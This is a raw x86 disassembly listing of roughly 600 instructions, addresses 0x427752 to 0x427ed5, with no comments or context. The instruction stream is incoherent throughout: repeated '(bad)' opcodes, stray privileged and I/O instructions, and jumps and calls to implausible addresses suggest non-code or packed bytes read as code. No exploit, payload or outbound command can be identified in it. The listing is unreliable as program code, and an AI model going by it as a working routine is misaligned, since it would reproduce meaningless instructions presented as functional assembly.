  427752:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  427759:	mov    eax,ebx
  42775b:	cld    
  42775c:	test   BYTE PTR [eax+0x320198],bh
  427762:	mov    DWORD PTR [ebp+0x8],esi
  427765:	xor    eax,DWORD PTR [ebp-0x73]
  427768:	test   DWORD PTR [esp+esi*2-0x1],edi
  42776c:	mov    ebp,eax
  42776e:	mov    eax,0x33004d29
  427773:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  427779:	add    DWORD PTR [eax],eax
  42777b:	add    BYTE PTR [ebp+0x30],al
  42777e:	mov    edx,DWORD PTR [edi-0x48]
  427781:	add    ebx,0xffffffe4
  427784:	push   0x2b74cd85
  427789:	mov    eax,DWORD PTR [ebx]
  42778b:	cld    
  42778c:	sar    BYTE PTR [eax+0x3b0145],1
  427792:	pcmpeqw mm4,mm6
  427795:	xor    edi,edi
  427797:	lea    ecx,[ebx-0x239c7470]
  42779d:	add    BYTE PTR [ebp+0x50],cl
  4277a0:	cmp    eax,DWORD PTR [ebp+0x75]
  4277a3:	mov    ebp,DWORD PTR [eax-0x68]
  4277a6:	test   DWORD PTR [eax],eax
  4277a8:	clc    
  4277a9:	push   DWORD PTR [ebp-0x1]
  4277ac:	lea    ecx,[eax]
  4277ae:	int3   
  4277af:	inc    ebp
  4277b0:	call   0xfaa840
  4277b5:	jne    0x4277af
  4277b7:	xor    edi,DWORD PTR [ebp-0x41]
  4277ba:	jmp    0x42782e
  4277bc:	mov    eax,DWORD PTR [eax]
  4277be:	mov    eax,0x339545c7
  4277c3:	inc    DWORD PTR [ebx]
  4277c5:	push   DWORD PTR [ecx]
  4277c7:	aaa    
  4277c8:	mov    eax,DWORD PTR [eax]
  4277ca:	jmp    0x42781c
  4277cc:	mov    eax,DWORD PTR [ebp-0x3c]
  4277cf:	mov    eax,eax
  4277d1:	cld    
  4277d2:	clc    
  4277d3:	ret    
  4277d4:	test   bh,al
  4277d6:	pop    es
  4277d7:	xchg   ebp,eax
  4277d8:	add    bh,bh
  4277da:	inc    ebp
  4277db:	dec    DWORD PTR [edi]
  4277dd:	and    DWORD PTR [ebx],ebp
  4277df:	add    BYTE PTR [eax],al
  4277e1:	push   eax
  4277e2:	jbe    0x427839
  4277e4:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  4277ea:	or     al,0xcf
  4277ec:	inc    eax
  4277ed:	enter  0x745,0x72
  4277f1:	inc    ebp
  4277f2:	mov    eax,DWORD PTR [ecx]
  4277f4:	int3   
  4277f5:	add    BYTE PTR [ebp-0x75],al
  4277f8:	cmp    BYTE PTR [eax+0x33c74d9c],bh
  4277fe:	ror    BYTE PTR [ebp+0x72f80885],1
  427804:	inc    ebp
  427805:	add    BYTE PTR [ebx-0x3c7423bb],cl
  42780b:	fadd   st,st(6)
  42780d:	rol    BYTE PTR [ebp+0x12],0x8b
  427811:	inc    ebp
  427812:	fmul   QWORD PTR [ebx-0x3c39233d]
  427818:	inc    ebp
  427819:	test   bh,al
  42781b:	cwde   
  42781c:	clc    
  42781d:	xor    al,BYTE PTR [ebp+0x45dcf889]
  427823:	inc    ebp
  427824:	cmp    dh,BYTE PTR [ebx]
  427826:	pushf  
  427827:	mov    ecx,0xffb48dc7
  42782c:	test   eax,ecx
  42782e:	clc    
  42782f:	dec    ebp
  427830:	inc    ebp
  427831:	mov    edi,DWORD PTR [eax+ecx*1]
  427834:	pushf  
  427835:	rol    edi,0x86
  427838:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427839:	inc    BYTE PTR [ebp+0x45f7f8ff]
  42783f:	inc    ebp
  427840:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x18e8c8c7]
  427848:	test   DWORD PTR [eax],edi
  42784a:	clc    
  42784b:	pushf  
  42784c:	inc    ebp
  42784d:	dec    DWORD PTR [ebx-0x3cba0f04]
  427853:	push   eax
  427854:	(bad)  
  427855:	cld    
  427856:	jge    0x427858
  427858:	cmp    ecx,DWORD PTR [ebx-0x3be776f1]
  42785e:	add    BYTE PTR [ebx],dl
  427860:	jmp    0xcd79b2
  427865:	les    eax,FWORD PTR [ebp-0x35]
  427868:	mov    ecx,esi
  42786a:	lock or al,cl
  42786d:	clc    
  42786e:	inc    ebp
  42786f:	add    esi,DWORD PTR [ebx]
  427871:	jge    0x427876
  427873:	xor    edi,DWORD PTR [ebx]
  427875:	cmp    ecx,DWORD PTR [edi]
  427877:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  42787c:	mov    edi,DWORD PTR [ecx]
  42787e:	test   al,0xcc
  427880:	dec    ebp
  427881:	test   BYTE PTR [ebx],dh
  427883:	pop    es
  427884:	xor    eax,DWORD PTR [eax]
  427886:	add    ecx,DWORD PTR [esi]
  427888:	add    ecx,eax
  42788a:	psraw  mm0,mm1
  42788d:	sub    BYTE PTR [ebp+0x38],cl
  427890:	mov    edi,DWORD PTR [ebx]
  427892:	lock int3 
  427894:	shl    edx,1
  427896:	rol    BYTE PTR [ebp+0xc],1
  427899:	mov    DWORD PTR [ebp-0x24],0xf8038533
  4278a0:	jmp    0x7b78ea
  4278a5:	pushf  
  4278a6:	inc    ebp
  4278a7:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  4278ad:	xor    ecx,ebx
  4278af:	add    ecx,esi
  4278b1:	mov    esi,eax
  4278b3:	enter  0x45af,0x8b
  4278b7:	xor    ecx,eax
  4278b9:	add    edx,DWORD PTR [ebp-0x77]
  4278bc:	sub    ecx,DWORD PTR [eax]
  4278be:	cmp    eax,DWORD PTR [ebp+0x77]
  4278c1:	fmul   DWORD PTR [ebx-0x76385764]
  4278c7:	test   al,0x0
  4278c9:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  4278cf:	cmp    esi,DWORD PTR [ebx]
  4278d1:	pushf  
  4278d2:	xor    eax,edi
  4278d4:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  4278db:	inc    ebp
  4278dc:	dec    ebp
  4278dd:	cmp    eax,0xc7f09c8b
  4278e2:	sar    DWORD PTR [eax+edx*8+0x45f80585],1
  4278e9:	inc    ebp
  4278ea:	jmp    0x42792b
  4278ec:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  4278f3:	dec    ebp
  4278f4:	xor    esi,DWORD PTR [ebx]
  4278f6:	add    eax,DWORD PTR [ebx]
  4278f8:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  4278fe:	dec    ebp
  4278ff:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  427905:	out    dx,eax
  427906:	rol    BYTE PTR [eax],1
  427908:	add    eax,0xebc8458b
  42790d:	dec    ebp
  42790e:	mov    ebp,DWORD PTR [ebx]
  427910:	mov    esp,0x33f84d8b
  427915:	ret    
  427916:	xor    eax,esi
  427918:	add    ecx,eax
  42791a:	add    eax,DWORD PTR [edx+0xc1010f]
  427920:	dec    ebp
  427921:	inc    ebp
  427922:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  427928:	ror    bl,1
  42792a:	add    eax,0xebc645ce
  42792f:	scas   eax,DWORD PTR es:[edi]
  427930:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  427936:	xor    ebp,DWORD PTR [ebx]
  427938:	xor    edi,DWORD PTR [ebx]
  42793a:	add    esi,DWORD PTR [edi+0x3]
  42793d:	mov    ecx,DWORD PTR [edi]
  42793f:	clc    
  427940:	rol    ebx,0x4d
  427943:	(bad)  
  427944:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  42794b:	mov    ah,0x45
  42794d:	dec    ebp
  42794e:	jbe    0x427983
  427950:	mov    esi,DWORD PTR [ebx]
  427952:	call   0x3345c65a
  427957:	rdpmc  
  427959:	rol    DWORD PTR [ebx],0x4d
  42795c:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  427962:	inc    ebp
  427963:	ror    BYTE PTR [ebx+0x45450808],1
  427969:	jmp    0x10a79f9
  42796e:	inc    ebp
  42796f:	inc    ebp
  427970:	(bad)  
  427971:	mov    ebx,eax
  427973:	clc    
  427974:	test   ebx,eax
  427976:	clc    
  427977:	retf   
  427978:	inc    ebp
  427979:	into   
  42797a:	mov    esi,0x8b85afec
  427980:	clc    
  427981:	enter  0x5545,0x3a
  427985:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  42798c:	ret    
  42798d:	mov    ah,0xc6
  42798f:	addr16 push 0x338b4545
  427995:	clc    
  427996:	add    eax,ebx
  427998:	loopne 0x427965
  42799a:	dec    ebp
  42799b:	into   
  42799c:	mov    al,dh
  42799e:	or     BYTE PTR [edi-0x37ff748e],ch
  4279a4:	inc    ebp
  4279a5:	push   ebp
  4279a6:	mov    ebp,DWORD PTR [ebx]
  4279a8:	in     al,dx
  4279a9:	cmp    eax,ebx
  4279ab:	ja     0x4279f2
  4279ad:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  4279b3:	inc    ebp
  4279b4:	cwde   
  4279b5:	mov    esi,DWORD PTR [edx]
  4279b7:	clc    
  4279b8:	mov    bl,al
  4279ba:	xlat   BYTE PTR ds:[ebx]
  4279bb:	retf   
  4279bc:	inc    ebp
  4279bd:	into   
  4279be:	mov    eax,esi
  4279c0:	in     al,dx
  4279c1:	scas   eax,DWORD PTR es:[edi]
  4279c2:	retf   
  4279c3:	mov    ecx,DWORD PTR [ebp-0x38]
  4279c6:	mov    edx,DWORD PTR [ebp-0x24]
  4279c9:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8868]
  4279d0:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  4279d7:	mov    eax,DWORD PTR [ebx]
  4279d9:	clc    
  4279da:	loopne 0x42799f
  4279dc:	push   ebp
  4279dd:	retf   
  4279de:	mov    dh,al
  4279e0:	adc    esi,ecx
  4279e2:	jb     0x427993
  4279e4:	add    BYTE PTR [ebx+0x558bc845],cl
  4279ea:	in     al,dx
  4279eb:	sub    eax,ebx
  4279ed:	cmp    ecx,ebx
  4279ef:	mov    eax,esi
  4279f1:	mov    esp,0x45af03ce
  4279f6:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  4279fc:	mov    eax,ebx
  4279fe:	in     al,dx
  4279ff:	into   
  427a00:	dec    ebp
  427a01:	(bad)  
  427a02:	xor    ebp,DWORD PTR [edi+0x80f8903]
  427a08:	rol    DWORD PTR [ebp+0x4d],0x89
  427a0c:	xor    esp,esp
  427a0e:	sub    eax,DWORD PTR [ebp-0x75]
  427a11:	add    ebp,esp
  427a13:	mov    al,0x55
  427a15:	inc    ebp
  427a16:	xor    edi,DWORD PTR [eax]
  427a18:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  427a1f:	inc    ebp
  427a20:	xor    edi,DWORD PTR [ecx]
  427a22:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  427a29:	test   DWORD PTR [eax],eax
  427a2b:	clc    
  427a2c:	enter  0x8645,0x33
  427a30:	inc    DWORD PTR [ebx]
  427a32:	(bad)  
  427a33:	jmp    0x427a7a
  427a35:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  427a3b:	inc    ebp
  427a3c:	(bad)  
  427a3d:	mov    ebp,DWORD PTR [edi-0x277b7424]
  427a43:	cwde   
  427a44:	retf   
  427a45:	xor    al,cl
  427a47:	mov    BYTE PTR [ebp+0xb],cl
  427a4a:	lea    eax,[ebp+0x8]
  427a4d:	xor    esi,DWORD PTR [edx+0x3]
  427a50:	add    al,ah
  427a52:	inc    ebp
  427a53:	dec    ebp
  427a54:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  427a5a:	push   0x2b45cd00
  427a5f:	mov    al,BYTE PTR [ebx]
  427a61:	or     esi,eax
  427a63:	dec    ebp
  427a64:	inc    ebp
  427a65:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  427a6b:	push   ebp
  427a6c:	(bad)  
  427a6d:	mov    BYTE PTR [edi+0xf723b11],ch
  427a73:	add    ch,ch
  427a75:	inc    ebp
  427a76:	dec    DWORD PTR [ebx-0x34332775]
  427a7c:	add    al,0x4d
  427a7e:	inc    ebp
  427a7f:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  427a85:	cwde   
  427a86:	add    DWORD PTR [edx],esi
  427a88:	add    BYTE PTR [ebx+0x4d00c000],cl
  427a8e:	push   DWORD PTR [ebx]
  427a90:	int3   
  427a91:	xor    eax,DWORD PTR [eax]
  427a93:	add    edx,DWORD PTR [eax+0x3]
  427a96:	mov    DWORD PTR [edi],ecx
  427a98:	call   0x42883b5e
  427a9d:	mov    DWORD PTR [ebp-0x20],esp
  427aa0:	add    BYTE PTR [ebp+0x7d],al
  427aa3:	mov    eax,DWORD PTR [eax]
  427aa5:	in     al,0x15
  427aa7:	ret    
  427aa8:	iret   
  427aa9:	(bad)  
  427aaa:	enter  0x14af,0x8b
  427aae:	(bad)  
  427aaf:	in     al,dx
  427ab0:	or     bl,cl
  427ab2:	adc    cl,al
  427ab4:	push   ebp
  427ab5:	dec    ebp
  427ab6:	inc    eax
  427ab7:	mov    edx,DWORD PTR [ebp-0x20]
  427aba:	jb     0x427a87
  427abc:	mov    ecx,esi
  427abe:	cld    
  427abf:	scas   eax,DWORD PTR es:[edi]
  427ac0:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  427ac7:	mov    BYTE PTR [eax],0x8c
  427aca:	push   0xffffff98
  427acc:	push   edi
  427acd:	xor    dl,BYTE PTR [eax+0x3b]
  427ad0:	mov    ecx,DWORD PTR [edi]
  427ad2:	call   0x8c41c035
  427ad7:	mov    eax,eax
  427ad9:	in     al,dx
  427ada:	jge    0x427b29
  427adc:	mov    DWORD PTR [ebx],esi
  427ade:	int3   
  427adf:	add    eax,DWORD PTR [ebp+0xf]
  427ae2:	xor    eax,ecx
  427ae4:	(bad)  
  427ae5:	dec    ebp
  427ae6:	pushf  
  427ae7:	xor    ecx,eax
  427ae9:	add    edi,DWORD PTR [edi]
  427aeb:	mov    eax,DWORD PTR [ebp-0x38]
  427aee:	rol    BYTE PTR [eax+edx*8-0x14cdfc68],1
  427af5:	mov    DWORD PTR [edx+0xf4505c8],ecx
  427afb:	xor    edx,DWORD PTR [ecx+edi*4]
  427afe:	or     BYTE PTR [ebp-0x371600bd],0xf
  427b05:	dec    ebp
  427b06:	leave  
  427b07:	mov    edx,ecx
  427b09:	rol    BYTE PTR [ebp+0x330155],1
  427b0f:	add    ecx,DWORD PTR [ebp+0xf]
  427b12:	xor    eax,edx
  427b14:	(bad)  
  427b15:	ror    DWORD PTR [eax],0x86
  427b18:	jb     0x427b17
  427b1a:	add    bh,bh
  427b1c:	clc    
  427b1d:	inc    ebp
  427b1e:	jb     0x427b8a
  427b20:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  427b26:	cmp    BYTE PTR [ebx+0xc7d89c],cl
  427b2c:	shr    BYTE PTR [eax-0x3d],0x30
  427b30:	clc    
  427b31:	add    BYTE PTR [ebp+0x75],al
  427b34:	cmp    BYTE PTR [edx-0x64],ch
  427b37:	inc    edi
  427b39:	adc    al,0xe8
  427b3b:	inc    ebp
  427b3c:	test   DWORD PTR [ebp-0x7cba8b08],eax
  427b42:	mov    ecx,DWORD PTR [eax]
  427b44:	cld    
  427b45:	or     DWORD PTR [ebp-0x34],0x33
  427b49:	jbe    0x427b4e
  427b4b:	mov    edx,DWORD PTR [ecx+0x2b]
  427b4e:	dec    ebp
  427b4f:	mov    cl,BYTE PTR [ebx+0x45d801]
  427b55:	mov    BYTE PTR [ebx],dh
  427b57:	mov    eax,DWORD PTR [ebx]
  427b59:	or     BYTE PTR [ecx+0x3b],dl
  427b5c:	dec    ebp
  427b5d:	int3   
  427b5e:	xor    ebp,edi
  427b60:	add    eax,DWORD PTR [ebp+0x51]
  427b63:	mov    ecx,DWORD PTR [ebp-0x28]
  427b66:	xor    eax,DWORD PTR [eax]
  427b68:	add    ebp,DWORD PTR [eax+0x51]
  427b6b:	adc    BYTE PTR [eax+0x0],0x8b
  427b6f:	add    BYTE PTR [ebx+0x4d18fcff],cl
  427b75:	inc    ebp
  427b76:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  427b7c:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  427b82:	dec    ebp
  427b83:	mov    esi,DWORD PTR [ebx]
  427b85:	hlt    
  427b86:	add    eax,ebx
  427b88:	push   ecx
  427b89:	inc    ebp
  427b8a:	dec    ebp
  427b8b:	sar    bh,1
  427b8d:	shl    ah,1
  427b8f:	(bad)  
  427b90:	retf   
  427b91:	mov    al,ds:0xc5ff3dce
  427b96:	adc    al,0xc6
  427b98:	inc    ebp
  427b99:	and    eax,0x9c0f4c85
  427b9e:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  427ba5:	cmp    BYTE PTR [ebx+0x3b],0x0
  427ba9:	mov    dh,0xc7
  427bab:	cmp    eax,eax
  427bad:	jne    0x454373f9
  427bb3:	mov    edi,DWORD PTR [edx]
  427bb5:	mov    eax,0x848bcb9c
  427bba:	rcr    BYTE PTR [eax-0x7c7fcd0f],0x68
  427bc1:	or     BYTE PTR [edi],cl
  427bc3:	(bad)  
  427bc4:	dec    ebp
  427bc5:	inc    edi
  427bc6:	add    bh,0x50
  427bc9:	or     cl,ch
  427bcb:	test   DWORD PTR [eax+0x4d4501f8],ecx
  427bd1:	xchg   DWORD PTR [eax-0x1638af64],eax
  427bd7:	mov    esp,0xf802b588
  427bdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427bdd:	inc    ebp
  427bde:	(bad)  
  427bdf:	cmp    al,0xff
  427be1:	pushf  
  427be2:	or     DWORD PTR [ecx+0x45ffe474],0x0
  427be9:	mov    ecx,DWORD PTR [ebp-0x340018]
  427bef:	into   
  427bf0:	dec    DWORD PTR [ebx-0x7f72431c]
  427bf6:	push   0x5000ff01
  427bfb:	retf   
  427bfc:	inc    ebp
  427bfd:	into   
  427bfe:	dec    DWORD PTR [ebx-0x343f3ff4]
  427c04:	push   eax
  427c05:	into   
  427c06:	call   0x4a8096
  427c0b:	retf   
  427c0c:	add    dh,cl
  427c0e:	add    bh,bh
  427c10:	mov    DWORD PTR [eax+ecx*1],edx
  427c13:	clc    
  427c14:	inc    ebp
  427c15:	inc    ebp
  427c16:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  427c1c:	push   0x1
  427c1e:	push   edi
  427c1f:	add    BYTE PTR [eax-0x35],dl
  427c22:	mov    ecx,esi
  427c24:	cld    
  427c25:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  427c2b:	into   
  427c2c:	ror    BYTE PTR [ebx+0x75000800],0x50
  427c33:	xor    eax,DWORD PTR [ebp+0x3]
  427c36:	jne    0x427c89
  427c38:	call   DWORD PTR [eax-0x3c]
  427c3b:	mov    DWORD PTR [ecx-0x18],edx
  427c3e:	mov    edi,edi
  427c40:	call   0x8b45c1c9
  427c45:	add    ah,ah
  427c47:	rol    BYTE PTR [ebp-0x7c],0xeb
  427c4b:	add    edi,edi
  427c4d:	add    al,ch
  427c4f:	inc    ebp
  427c50:	push   ecx
  427c51:	cmp    ecx,DWORD PTR [ebx+0x45c7c49c]
  427c57:	mov    al,0xc7
  427c59:	test   esp,esp
  427c5b:	clc    
  427c5c:	test   DWORD PTR [ebp-0x8],ecx
  427c5f:	add    BYTE PTR [ebp+0x50],0x39
  427c63:	jmp    0x8bcc0504
  427c68:	in     al,dx
  427c69:	or     BYTE PTR [ebp-0xf],al
  427c6c:	xor    eax,DWORD PTR [eax+0x4f896803]
  427c72:	hlt    
  427c73:	mov    eax,DWORD PTR [ebp-0x50]
  427c76:	xor    esi,ecx
  427c78:	add    eax,DWORD PTR [eax+0x4f086889]
  427c7e:	inc    ebp
  427c7f:	sbb    eax,0x68
  427c82:	pushf  
  427c83:	inc    edi
  427c85:	add    al,ch
  427c87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c88:	test   edi,edi
  427c8a:	clc    
  427c8b:	inc    DWORD PTR [ebp-0x73]
  427c8e:	cmp    esi,DWORD PTR [esp+ebx*4-0x1]
  427c92:	(bad)  
  427c93:	push   ecx
  427c94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427c95:	jne    0x427c1c
  427c97:	push   eax
  427c98:	clc    
  427c99:	test   DWORD PTR [ebp-0x1],eax
  427c9c:	cmp    eax,0xc78b9cff
  427ca1:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  427ca8:	inc    ebp
  427ca9:	push   edi
  427caa:	aas    
  427cab:	sbb    bl,BYTE PTR [eax+eax*1-0x7f1b9775]
  427cb2:	dec    ebp
  427cb3:	add    BYTE PTR [ebx],dh
  427cb5:	inc    ebp
  427cb6:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  427cbc:	enter  0x8401,0x0
  427cc0:	add    al,BYTE PTR [eax]
  427cc2:	add    bh,bh
  427cc4:	out    dx,eax
  427cc5:	sbb    BYTE PTR [eax],al
  427cc7:	dec    ebp
  427cc8:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  427cce:	sub    esi,DWORD PTR [ebx]
  427cd0:	mov    ebp,DWORD PTR [eax-0x8]
  427cd3:	add    bl,0x0
  427cd6:	(bad)  
  427cd7:	cmp    eax,ecx
  427cd9:	or     BYTE PTR [edx+0x750114],al
  427cdf:	inc    DWORD PTR [ebp+0x18]
  427ce2:	mov    eax,DWORD PTR [ebp-0x8]
  427ce5:	mov    ebx,eax
  427ce7:	(bad)  
  427ce8:	retf   
  427ce9:	inc    ebp
  427cea:	into   
  427ceb:	mov    esi,eax
  427ced:	int3   
  427cee:	scas   eax,DWORD PTR es:[edi]
  427cef:	push   es
  427cf0:	mov    esi,DWORD PTR [ebp-0xc]
  427cf3:	call   DWORD PTR [ebp+0x18]
  427cf6:	sub    edi,DWORD PTR [ebp+0x3b]
  427cf9:	mov    esi,DWORD PTR [edi-0x34]
  427cfc:	mov    eax,DWORD PTR [ebp-0x8]
  427cff:	cmp    bl,al
  427d01:	pushf  
  427d02:	mov    bh,0xbc
  427d05:	fadd   QWORD PTR [eax]
  427d07:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  427d0d:	mov    esi,DWORD PTR [ebx]
  427d0f:	in     al,0x33
  427d11:	ret    
  427d12:	add    eax,esi
  427d14:	add    eax,DWORD PTR [ebp+0xf]
  427d17:	mov    eax,ecx
  427d19:	in     al,0x4d
  427d1b:	ret    
  427d1c:	mov    eax,esi
  427d1e:	in     al,dx
  427d1f:	inc    ebp
  427d20:	rol    edi,1
  427d22:	sar    al,1
  427d24:	or     BYTE PTR [ebp+0x45e9f845],al
  427d2a:	add    BYTE PTR [edx],bh
  427d2c:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  427d33:	test   ebx,eax
  427d35:	clc    
  427d36:	retf   
  427d37:	inc    ebp
  427d38:	into   
  427d39:	cmp    al,0xc6
  427d3b:	pushf  
  427d3c:	scas   eax,DWORD PTR es:[edi]
  427d3d:	(bad)  
  427d3e:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  427d45:	inc    ebp
  427d46:	cmp    edi,DWORD PTR [esi]
  427d48:	ja     0x427ce6
  427d4a:	mov    eax,edi
  427d4c:	mov    esp,0x458567a8
  427d51:	clc    
  427d52:	mov    eax,DWORD PTR [ebp-0x8]
  427d55:	mov    eax,ebx
  427d57:	in     al,dx
  427d58:	retf   
  427d59:	ret    
  427d5a:	into   
  427d5b:	mov    dh,0x7d
  427d5e:	scas   eax,DWORD PTR es:[edi]
  427d5f:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  427d65:	add    BYTE PTR [ebx],ch
  427d67:	jmp    0xb97ea7
  427d6c:	mov    eax,DWORD PTR [ebp-0x5c]
  427d6f:	mov    eax,DWORD PTR [ebp-0x14]
  427d72:	inc    ebp
  427d73:	enter  0x458b,0xf8
  427d77:	xor    eax,ebx
  427d79:	add    ecx,ebx
  427d7b:	cmp    ecx,esi
  427d7d:	shufps xmm7,xmm4,0xaf
  427d81:	add    BYTE PTR [ebx+0x55e8f48b],cl
  427d87:	dec    ebp
  427d88:	sub    esi,DWORD PTR [ebx]
  427d8a:	cmp    esi,DWORD PTR [ebx]
  427d8c:	ja     0x427d91
  427d8e:	mov    eax,DWORD PTR [ebx]
  427d90:	lods   al,BYTE PTR ds:[esi]
  427d91:	mov    db0,ecx
  427d94:	inc    ebp
  427d95:	dec    ebp
  427d96:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  427d9c:	retf   
  427d9d:	rol    dh,1
  427d9f:	or     al,0xce
  427da1:	inc    ebp
  427da2:	scas   eax,DWORD PTR es:[edi]
  427da3:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  427da9:	add    BYTE PTR [ebx],ch
  427dab:	add    BYTE PTR [ebx],bh
  427dad:	inc    ebp
  427dae:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  427db4:	inc    ebp
  427db5:	retf   
  427db6:	mov    ecx,esi
  427db8:	clc    
  427db9:	(bad)  
  427dba:	retf   
  427dbb:	scas   eax,DWORD PTR es:[edi]
  427dbc:	ret    
  427dbd:	mov    ecx,esi
  427dbf:	hlt    
  427dc0:	(bad)  
  427dc1:	push   ebp
  427dc2:	scas   eax,DWORD PTR es:[edi]
  427dc3:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  427dc9:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  427dcf:	add    BYTE PTR [ebx],al
  427dd1:	mov    eax,eax
  427dd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427dd4:	inc    ebp
  427dd5:	dec    ebp
  427dd6:	cmp    BYTE PTR [ebx],dh
  427dd8:	pushf  
  427dd9:	xor    ecx,DWORD PTR [ecx+0x4503d003]
  427ddf:	(bad)  
  427de1:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  427de9:	sar    eax,1
  427deb:	rol    BYTE PTR [ebp+0x5],1
  427dee:	xor    eax,DWORD PTR [ebp+0x3]
  427df1:	jmp    0x427dde
  427df3:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  427df9:	xor    eax,DWORD PTR [ebp+0x33]
  427dfc:	mov    eax,DWORD PTR [ebx]
  427dfe:	rol    BYTE PTR [ebx],1
  427e00:	test   BYTE PTR [edi],cl
  427e02:	cwde   
  427e03:	shl    DWORD PTR [edx],0x4d
  427e06:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  427e0c:	xor    edx,eax
  427e0e:	add    eax,DWORD PTR ds:0xeb4d45e0
  427e14:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  427e1a:	add    BYTE PTR [ebx],dh
  427e1c:	inc    ebp
  427e1d:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  427e23:	rdpmc  
  427e25:	rol    DWORD PTR [ebx],0x4d
  427e28:	loopne 0x427db5
  427e2a:	push   ebp
  427e2b:	in     al,dx
  427e2c:	mov    cl,dl
  427e2e:	adc    eax,edx
  427e30:	jb     0x427e37
  427e32:	add    BYTE PTR [ebp+0x45],al
  427e35:	jmp    0x427dc2
  427e37:	mov    ebx,eax
  427e39:	test   al,0xcb
  427e3b:	dec    ebp
  427e3c:	dec    ebp
  427e3d:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  427e43:	add    ebx,DWORD PTR [eax-0x743ecdf1]
  427e49:	dec    ebp
  427e4a:	mov    al,0x8b
  427e4c:	dec    ebp
  427e4d:	in     al,dx
  427e4e:	xor    edx,ecx
  427e50:	xor    edx,eax
  427e52:	add    eax,DWORD PTR [ebp+0x3]
  427e55:	jbe    0x427e66
  427e57:	mov    eax,ecx
  427e59:	test   al,0x45
  427e5b:	dec    ebp
  427e5c:	mov    DWORD PTR [ebx],esi
  427e5e:	loopne 0x427e93
  427e60:	inc    ebp
  427e61:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  427e67:	rol    esi,0x45
  427e6a:	scas   eax,DWORD PTR es:[edi]
  427e6b:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  427e71:	mov    eax,ecx
  427e73:	hlt    
  427e74:	dec    ebp
  427e75:	inc    ebp
  427e76:	mov    eax,edi
  427e78:	loopne 0x427e52
  427e7a:	retf   
  427e7b:	test   esi,ecx
  427e7d:	clc    
  427e7e:	scas   eax,DWORD PTR es:[edi]
  427e7f:	inc    ebp
  427e80:	mov    eax,edi
  427e82:	fdiv   st,st(0)
  427e84:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  427e8a:	cwde   
  427e8b:	cmp    dh,BYTE PTR [edx]
  427e8d:	pushf  
  427e8e:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  427e94:	inc    esi
  427e96:	mov    ebp,DWORD PTR [eax-0x10]
  427e99:	inc    ebp
  427e9a:	dec    ebp
  427e9b:	xor    esi,DWORD PTR [ebx]
  427e9d:	add    eax,DWORD PTR [ebx]
  427e9f:	loopne 0x427eb0
  427ea1:	dec    ebp
  427ea2:	ror    DWORD PTR [edx+0x7233084d],0x3
  427ea9:	add    BYTE PTR [ebx-0x7b740bbb],cl
  427eaf:	lock cwde 
  427eb1:	ret    
  427eb2:	xor    al,BYTE PTR [ebp-0x77]
  427eb5:	mov    esi,esp
  427eb7:	rol    BYTE PTR [ebp-0x7c],1
  427eba:	xor    ebx,DWORD PTR [eax-0x7772cd47]
  427ec0:	call   edi
  427ec2:	enter  0x4d45,0x8b
  427ec6:	mov    esi,eax
  427ec8:	fmul   st(3),st
  427eca:	push   ebp
  427ecb:	dec    ebp
  427ecc:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  427ed2:	ret    0xc198
  427ed5:	xor    al,BYTE PTR [esi-0x280276]
